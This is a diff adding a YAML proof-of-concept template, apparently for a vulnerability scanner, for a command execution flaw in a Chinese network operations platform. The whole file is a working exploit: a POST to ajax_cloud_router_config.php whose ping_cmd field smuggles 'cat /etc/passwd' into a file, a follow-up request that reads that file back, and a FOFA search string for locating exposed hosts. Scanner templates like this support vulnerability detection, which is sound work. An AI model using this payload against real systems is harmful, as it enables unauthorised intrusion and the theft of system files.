@@ -1,0 +1,22 @@
+id: poc-yaml-tg-holographic-ai-ajax-cloud-router-config-rce
+info:
+  name: 全息AI网络运维平台 ajax_cloud_router_config.php 命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 全息AI网络运维平台
+  fofa: body="全息AI网络运维平台"
+variables:
+  t1: random_str(4)
+requests:
+- method: POST
+  path: /nmss/cloud/Ajax/ajax_cloud_router_config.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: ping_cmd=8.8.8.8|cat /etc/passwd>{{.t1}}.txt
+  expression: status_code == 200
+- method: GET
+  path: /nmss/cloud/Ajax/{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
